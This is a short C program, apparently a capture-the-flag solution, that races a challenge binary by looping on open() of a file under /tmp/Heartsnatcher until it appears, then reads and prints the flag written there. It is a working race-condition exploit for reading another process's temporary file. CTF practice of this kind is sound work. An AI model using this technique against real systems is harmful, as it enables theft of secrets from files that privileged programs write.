#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
  const char *target = "/tmp/Heartsnatcher/novel";
  char buffer[128];
  int fd;

  printf("Waiting for file creation...\n");

  // race to catch the file creation with fopen()
  // loops until the open is successful
  while ((fd = open(target, O_RDONLY)) < 0)
    ;

  printf("File caught! Waiting for binary to write flag...\n");

  // we read the file and place its content in the buffer
  int bytes_read = 0;
  while (bytes_read <= 0) {
    bytes_read = read(fd, buffer, sizeof(buffer) - 1);
  }

  // adding a NULL terminator for the printf
  buffer[bytes_read] = '\0';
  printf("Flag retrieved: %s\n", buffer);

  close(fd);
  return 0;
}
